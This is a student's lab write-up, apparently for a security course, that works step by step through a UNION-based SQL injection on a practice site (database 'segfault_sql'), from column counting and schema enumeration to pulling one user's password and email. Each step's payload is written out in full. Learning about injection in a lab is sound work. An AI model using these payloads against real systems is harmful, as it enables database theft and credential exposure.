---
title: "Week 6 - Assignment"
date: 2025-05-29
categories: [assignment]
layout: single
author_profile: true
sidebar:
  nav: "main"
read_time: true
toc: true
toc_label: "On this page"
toc_sticky: true
---

# Assignment 6 - 1 / Extracting Only doldol's Data

## (1). Identify the SQL Injection point
   
![스크린샷 2025-05-29 120037](https://github.com/user-attachments/assets/a7bf66d0-a58e-470b-b149-ac64d4603cd6)

By injecting a condition that always returns true (' OR '1'='1), all user accounts were displayed, confirming that the input is directly inserted into the SQL query.

## (2) Use ORDER BY to find the number of columns

Try injecting:

```
1234' order by [num] #
```

![image](https://github.com/user-attachments/assets/5bac249a-d89f-431d-8ddd-eed745916420)

- No error occurs for Order by 1 to 4
- However order by 5 makes the error
  
This tells us that the query has exactly 4 columns, since trying to sort by a non-existent fifth column causes a failure.

## (3) Use UNION SELECT to determine which columns are displayed

![image](https://github.com/user-attachments/assets/192e5e74-9c6b-4b59-be53-ab9bb6cd305c)

Each number (1, 2, 3, 4) is displayed in a different column on the page.
This confirms that **all four columns** are reflected in the output, meaning we can use any of them to display extracted data later (like usernames, emails, flags, etc.).


## (4) Use database() to find the current database name

![image](https://github.com/user-attachments/assets/e91cf7b5-2d25-409c-a2bb-c9815ce61339)

Try injecting:

```
1234' union select datbase(), 2, 3, 4#
```
The name of database is "segfault_sql"	


## (5) Use information_schema.tables to list all table names

![image](https://github.com/user-attachments/assets/45460560-556b-4688-ae25-27218c0a758c)

Try injecting:

```
1234' union select table_name, 2, 3, 4 from information_schema.tables where table_schema='segfault_sql' #
```
The names of the tables are **game, member, secret and secret_member**.

## (6) Use information_schema.columns to list all column names



Try injecting:

```
1234' union select column_name, 2, 3, 4 from information_schema.columns where table_name = 'member' #
```
The names of the coulmns in **member** table are **user_id, user_pass,	name, user_level, info ,id, pass and email**.



## (7) Finally, use UNION SELECT to extract the data

![image](https://github.com/user-attachments/assets/735d9c72-d0b8-49e1-8f4d-a430dda46d0c)
```
1234' union select id, pass, email, info from member #
```

For getting only doldol's data we fix the payload
```
' union select id, pass, email, info from member where id='doldol' #
```

Result:

![image](https://github.com/user-attachments/assets/dbda74c3-e0f9-4c40-a20f-c9cc8297b36b)






---

# Assignment 6 - 2 / CTF SQL Injection 1








